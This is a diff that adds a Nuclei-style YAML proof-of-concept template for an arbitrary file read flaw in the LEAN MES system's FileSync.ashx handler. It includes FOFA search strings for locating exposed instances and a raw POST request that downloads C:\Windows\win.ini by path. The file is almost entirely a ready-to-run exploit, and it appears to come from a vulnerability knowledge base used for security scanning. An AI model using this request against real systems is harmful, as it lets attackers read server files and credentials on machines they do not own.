@@ -1,0 +1,32 @@
+id: poc-rkensts259gyqcr8
+info:
+  name: 深科特LEAN MES系统 FileSync.ashx 存在任意文件读取漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rkensts259gyqcr8'
+  tags: lfi,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rkensts259gyqcr8
+    fofa: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+http:
+- raw:
+  - 'POST /Handler/FileSync.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1
+
+
+    type=DownLoad&sourceFileUrl=C:\\Windows\\win.ini'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
